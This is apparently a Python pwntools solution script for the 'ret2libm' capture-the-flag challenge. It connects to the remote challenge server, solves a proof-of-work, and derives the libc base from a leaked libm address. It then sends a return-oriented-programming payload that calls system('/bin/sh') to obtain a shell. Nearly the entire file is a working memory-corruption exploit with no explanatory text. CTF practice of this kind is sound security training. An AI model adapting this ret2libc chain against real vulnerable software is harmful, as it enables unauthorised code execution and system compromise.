#!/usr/bin/python3

from pwn import *

#p = process("./chal_patched")
p = remote("ret2libm.chal.irisc.tf", 10001)
elf = ELF("./chal_patched", checksec = 0)
libc = elf.libc
libm = ELF("./libm-2.27.so", checksec = 0)

def poc(solve: bytes):
    r = process(["./poc.py","solve", solve])
    r.recvuntil("Solution: \n")
    x = r.recvline().strip(b"\n")
    print("SOLUTION = ", x)
    r.close()
    return x


libm_to_libc_offset = 0x3f1000
libm_fabs64_offset = 0x31cf0

p.recvuntil(b"kctf-pow) solve ")
solve = p.recvline().strip(b"\n")
print("TO-SOLVE = ", solve)
solution = poc(solve)
p.sendlineafter(b"Solution? ", solution)


p.recvuntil(b"my pecs: ")
libm_base = int(p.recvline().strip(b"\n"), 16) - libm_fabs64_offset
log.info("libm base @ " + hex(libm_base))

libc.address = libm_base - libm_to_libc_offset
log.info("libc base @ " + hex(libc.address))

rdi = p64(libc.address + 0x000000000002164f)
ret = p64(libc.address + 0x00000000000008aa)
binsh = p64(next(libc.search(b"/bin/sh\x00")))
system = p64(libc.sym.system)

payload = flat(
    cyclic(16),
    rdi,
    binsh,
    ret,
    system
)

p.sendlineafter(b"yours? ", payload)

#gdb.attach(p)
p.interactive()
